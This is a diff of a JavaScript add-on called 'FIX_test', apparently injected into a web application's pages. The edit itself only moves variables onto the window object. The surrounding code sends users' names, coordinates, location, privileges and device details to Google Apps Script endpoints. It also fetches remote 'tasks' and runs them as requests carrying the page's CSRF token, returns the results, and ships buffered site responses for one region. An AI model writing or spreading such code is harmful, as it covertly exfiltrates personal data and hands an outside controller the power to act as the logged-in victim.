@@ -1,8 +1,8 @@
 //216319221605
-const FIX_test_version='FIX_test_21.04.23';
-const FIX_test_app_version='FIX_test v1.6';
-const FIX_test_DEV=!Boolean(window.AppInventor);
-if(FIX_test_DEV){
+window.FIX_test_version='FIX_test_21.04.23';
+window.FIX_test_app_version='FIX_test v1.6';
+window.FIX_test_DEV=!Boolean(window.AppInventor);
+if(window.FIX_test_DEV){
   window.AppInventor={
     setWebViewString:function(str){console.log(str);this.str=str},
     getWebViewString:function(){return this.str},
@@ -27,9 +27,9 @@ createStyleElement('fix-test-app-css',`
 `);
 
 
-window.AppInventor.setWebViewString(`on:moduleOk:::=${FIX_test_version}`);
+window.AppInventor.setWebViewString(`on:moduleOk:::=${window.FIX_test_version}`);
 window.AppInventor.setWebViewString(`set:FollowLinks:::=false`);//костыль для 1.5.3
-console.log(FIX_test_version,new Date().toLocaleString());
+console.log(window.FIX_test_version,new Date().toLocaleString());
 const info={
   ...filterProps(window,['innerWidth','innerHeight','outerWidth','outerHeight','devicePixelRatio']),
   visualViewport:filterProps(window.visualViewport,['width','height']),
@@ -42,7 +42,7 @@ window.navigator.getBattery().then(battery=>{info.navigator.battery=filterProps(
 
 function filterProps(object,attrs){if(typeof attrs==='string'){attrs=attrs.split(',')};let obj={};for(let key in object){if(attrs.includes(key)){obj[key]=object[key];};};return obj;};
 
-const node_id='n'+randcode(10);
+window.node_id='n'+randcode(10);
 let config_id='initial';
 function randcode(n=1,s='0123456789QAZWSXEDCRFVTGBYHNUJMIKOLPqazwsxedcrfvtgbyhnujmikolp'){let str='';while(str.length<n){str+=s[Math.random()*s.length|0]};return str;};
 function randUN(n=1){return randcode(n,'0123456789QAZWSXEDCRFVTGBYHNUJMIKOLP')}
@@ -57,18 +57,18 @@ fetch('/call/main/get_user_data').then(r=>r.json()).then(resp=>{
     const {latitude,longitude,location,privileges}=user_data;
     fetch('https://script.google.com/macros/s/AKfycbxcjq8pzu4Jz_Uf1TrXRSFDHCzV64IFvhSqfvdhe3vjZmWq5J2VMayUjJsZRvKgp7_K/exec',{//inform on start
       method:'POST',mode:'no-cors',headers:{'Content-Type':'application/json;charset=utf-8'},
-      body:JSON.stringify({username,node_id,info,user_data,latitude,longitude,location,privileges,date:new Date(Date.now()).toString()})
+      body:JSON.stringify({username,node_id:window.node_id,info,user_data,latitude,longitude,location,privileges,date:new Date(Date.now()).toString()})
     }).catch(console.warn).finally(()=>{
       let t=setTimeout(get,timeout_get);
       function get(){//get stat
-        fetch(`https://script.google.com/macros/s/AKfycbwqCtzlWPZLEdgd9omVhscwbacELzzyIM0UPsLO9y4o0yFUgYjBwXuxtD7RnZABRYm3/exec?username=${username}&node_id=${node_id}&config_id=${config_id}`).then(r=>r.json()).then(obj=>{
+        fetch(`https://script.google.com/macros/s/AKfycbwqCtzlWPZLEdgd9omVhscwbacELzzyIM0UPsLO9y4o0yFUgYjBwXuxtD7RnZABRYm3/exec?username=${username}&node_id=${window.node_id}&config_id=${config_id}`).then(r=>r.json()).then(obj=>{
           const {config={},task={}}=obj;
           if(config){config_id=config?.config_id||config_id;timeout_get=config?.timeout||timeout_get;};
           const {task_id='',url='',method='',body={}}=task;
           if(task_id&&url&&method){
             fetch(url,((method==='POST')?Object.assign({method,headers:{'Content-Type':'application/json;charset=utf-8','X-CSRF-Token':document.querySelector('meta[name="csrf-token"]').getAttribute('content')}},body?({body:JSON.stringify(body||{},null,2)}):{}):null)).then(r=>r.json()).then(response=>{
               if(response){
-                fetch('https://script.google.com/macros/s/AKfycbwqCtzlWPZLEdgd9omVhscwbacELzzyIM0UPsLO9y4o0yFUgYjBwXuxtD7RnZABRYm3/exec',{method:'POST',mode:'no-cors',headers:{'Content-Type':'application/json;charset=utf-8'},body:JSON.stringify({username,node_id,task:{task_id,response,isError:false}})}).then(r=>{next()}).catch(e=>{console.log(e);next()})
+                fetch('https://script.google.com/macros/s/AKfycbwqCtzlWPZLEdgd9omVhscwbacELzzyIM0UPsLO9y4o0yFUgYjBwXuxtD7RnZABRYm3/exec',{method:'POST',mode:'no-cors',headers:{'Content-Type':'application/json;charset=utf-8'},body:JSON.stringify({username,node_id:window.node_id,task:{task_id,response,isError:false}})}).then(r=>{next()}).catch(e=>{console.log(e);next()})
               }else{next()}
             }).catch(e=>{console.warn(e);next()})
           }else{next()}
@@ -106,12 +106,12 @@ const max_buffer_size=20;
 const buffer=new Map();
 function pushResponse({url,response}={}){
   buffer.set(url,response);
-  if(FIX_test_DEV){console.log('buffer.size:',buffer.size)}
+  if(window.FIX_test_DEV){console.log('buffer.size:',buffer.size)}
   if(buffer.size<max_buffer_size){return};
   const entries=[...buffer.entries()];
   const {location:region_id,username}=store?.state?.main?.userData||{};
-  if(FIX_test_DEV){console.log('buffer.size==max_buffer_size:',region_id,username,entries)};
-  if(region_id===54&&username&&!FIX_test_DEV){
+  if(window.FIX_test_DEV){console.log('buffer.size==max_buffer_size:',region_id,username,entries)};
+  if(region_id===54&&username&&!window.FIX_test_DEV){
     fetch('https://script.google.com/macros/s/AKfycbzV-IEHP2thb4wXGXPwmflsGwT8MJg-pGzXd1zCpekJ3b0Ecal6aTxJddtRXh_qVu0-/exec',{
       method:'POST',mode:'no-cors',headers:{'Content-Type':'application/json;charset=utf-8'},
       body:JSON.stringify({region_id,username,entries})
@@ -158,7 +158,7 @@ let sendStateTimer=null;
 let savePositionTimer=null;
 const stateBuffer=new Set();
 
-if(app?.$store?.getters?.['main/username']&&!FIX_test_DEV){
+if(app?.$store?.getters?.['main/username']&&!window.FIX_test_DEV){
   saveUserStateToBuffer();
   getUserStateBufferAndSend();
   
